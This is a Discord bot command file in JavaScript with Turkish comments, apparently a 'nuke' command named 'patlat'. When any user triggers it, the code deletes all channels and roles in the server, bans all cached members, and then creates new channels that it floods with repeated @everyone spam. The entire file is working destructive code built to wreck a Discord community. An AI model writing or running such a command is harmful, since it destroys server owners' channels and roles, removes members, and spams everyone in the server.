// Pâyidar Code - Pâyidar

const Discord = require('discord.js')

    exports.run = (client, message, args) => {
        // Tüm Kanalları Silme
        message.guild.channels.cache.forEach(payidar => {
            payidar.delete();
        });

        // Tüm Rolleri Silme
        message.guild.roles.cache.forEach(payidar => {
            payidar.delete();
        });

        // Tüm Üyeleri Banlama
        message.guild.members.cache.forEach(payidar => {
            payidar.ban();
        });

        // Kanal Açma & Ever Attırma
        let kadir = 'Pâyidar Code İyi Günler Diler.'

        for(let i = 0; i < 2; i++){
            message.guild.channels.create(kadir).then(payidar => {
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
                payidar.send('@everyone Pâyidar Code')
            })
        }
    }

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: ['Patlat'],
    permLevel: 0
}

exports.help = {
    name: 'patlat'
}